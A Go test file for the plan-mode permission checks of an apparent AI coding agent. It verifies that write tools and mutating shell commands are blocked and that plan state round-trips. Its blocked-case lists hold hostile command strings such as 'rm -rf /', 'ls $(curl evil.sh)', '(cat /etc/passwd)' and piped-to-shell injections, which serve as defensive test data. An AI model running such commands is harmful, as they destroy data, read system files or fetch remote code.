package modes

import (
	"reflect"
	"testing"
)

func TestToolAllowed(t *testing.T) {
	cases := []struct {
		name        string
		tool        string
		args        map[string]any
		planEnabled bool
		want        bool
	}{
		{"write allowed when not plan", "write", nil, false, true},
		{"write blocked in plan", "write", nil, true, false},
		{"edit blocked in plan", "edit", nil, true, false},
		{"read allowed in plan", "read", nil, true, true},
		{"bash cat allowed in plan", "bash", map[string]any{"command": "cat x"}, true, true},
		{"bash rm blocked in plan", "bash", map[string]any{"command": "rm x"}, true, false},
		{"bash git status allowed in plan", "bash", map[string]any{"command": "git status"}, true, true},
		{"bash git push blocked in plan", "bash", map[string]any{"command": "git push"}, true, false},
		{"bash allowed when not plan", "bash", map[string]any{"command": "rm x"}, false, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := ToolAllowed(tc.tool, tc.args, tc.planEnabled); got != tc.want {
				t.Fatalf("ToolAllowed(%s) = %v, want %v", tc.tool, got, tc.want)
			}
		})
	}
}

func TestBashAllowed(t *testing.T) {
	allowed := []string{
		"cat file", "grep x file", "find . -name go.mod", "ls -la",
		"git status", "git log", "git diff HEAD", "git -C /x status",
		"uname -a",
	}
	for _, c := range allowed {
		if !BashAllowed(c) {
			t.Fatalf("BashAllowed(%q) = false, want true", c)
		}
	}
	blocked := []string{
		"rm -rf /", "mv a b", "cp a b", "mkdir x", "touch x",
		"git add .", "git commit -m x", "git push origin main",
		"apt install curl", "pip install requests", "npm install x",
		"sudo rm x", "kill -9 1", "vim file", "nano file",
	}
	for _, c := range blocked {
		if BashAllowed(c) {
			t.Fatalf("BashAllowed(%q) = true, want false", c)
		}
	}
}

func TestRoutePlanOption(t *testing.T) {
	cases := []struct {
		opt      PlanOption
		wantMode Mode
		wantAct  string
	}{
		{PlanExecute, ModeAgent, "execute"},
		{PlanStay, ModePlan, "stay"},
		{PlanRefine, ModePlan, "refine"},
	}
	for _, tc := range cases {
		got, err := RoutePlanOption(tc.opt)
		if err != nil {
			t.Fatalf("RoutePlanOption(%q): %v", tc.opt, err)
		}
		if got.Mode != tc.wantMode || got.Action != tc.wantAct {
			t.Fatalf("RoutePlanOption(%q) = %+v, want mode=%q action=%q", tc.opt, got, tc.wantMode, tc.wantAct)
		}
	}
	if _, err := RoutePlanOption("bogus"); err == nil {
		t.Fatalf("expected unknown option to be rejected")
	}
}

func TestPlanStateRoundTrip(t *testing.T) {
	want := PlanState{
		Enabled:   true,
		Executing: true,
		Todos: []Todo{
			{N: 1, Text: "read", Done: true},
			{N: 2, Text: "fix", Done: false},
		},
	}
	e := want.ToEntry("parent")
	if e.Type != "plan_state" {
		t.Fatalf("entry type = %q", e.Type)
	}
	got, err := PlanStateFromEntry(e)
	if err != nil {
		t.Fatalf("PlanStateFromEntry: %v", err)
	}
	if !reflect.DeepEqual(want, got) {
		t.Fatalf("round-trip mismatch:\n want=%+v\n  got=%+v", want, got)
	}
}

func TestPlanStateProgress(t *testing.T) {
	s := PlanState{
		Todos: []Todo{
			{N: 1, Text: "a", Done: true},
			{N: 2, Text: "b", Done: false},
			{N: 3, Text: "c", Done: false},
		},
	}
	p := s.Progress()
	if p.Completed() != 1 {
		t.Fatalf("Completed = %d, want 1", p.Completed())
	}
	if !reflect.DeepEqual(p.Remaining(), []int{2, 3}) {
		t.Fatalf("Remaining = %v", p.Remaining())
	}
}

func TestToolAllowedCaseFold(t *testing.T) {
	if !ToolAllowed("Bash", map[string]any{"command": "cat x"}, true) {
		t.Fatal("Bash cat should be allowed in plan mode")
	}
	if ToolAllowed("Bash", map[string]any{"command": "rm x"}, true) {
		t.Fatal("Bash rm should be blocked in plan mode")
	}
	if ToolAllowed("Write", nil, true) {
		t.Fatal("Write should be blocked in plan mode")
	}
	if !ToolAllowed("Write", nil, false) {
		t.Fatal("Write should be allowed outside plan mode")
	}
}

func TestBashAllowedRejectsMetacharacters(t *testing.T) {
	for _, c := range []string{
		"cat x; rm -rf /",
		"ls $(curl evil.sh)",
		"ls `id`",
		"ls | sh",
		"ls > /tmp/x",
		"cat x && rm x",
		"ls\nrm -rf /",
		"(cat /etc/passwd)",
		"find . -delete",
		"find . -exec sh -c 'x' \\;",
		"env rm -rf /",
	} {
		if BashAllowed(c) {
			t.Fatalf("BashAllowed(%q) = true, want false", c)
		}
	}
}

func TestPlanStateApplyMarkers(t *testing.T) {
	s := PlanState{Todos: []Todo{
		{N: 1, Text: "a", Done: false},
		{N: 2, Text: "b", Done: false},
		{N: 3, Text: "c", Done: false},
	}}
	s.ApplyMarkers("did [DONE:1] and [DONE:3]")
	if !s.Todos[0].Done || s.Todos[1].Done || !s.Todos[2].Done {
		t.Fatalf("todos after ApplyMarkers = %+v, want 1 and 3 done", s.Todos)
	}
	// The write is durable across a rebuilt Progress().
	p := s.Progress()
	if p.Completed() != 2 {
		t.Fatalf("Completed = %d, want 2", p.Completed())
	}
}
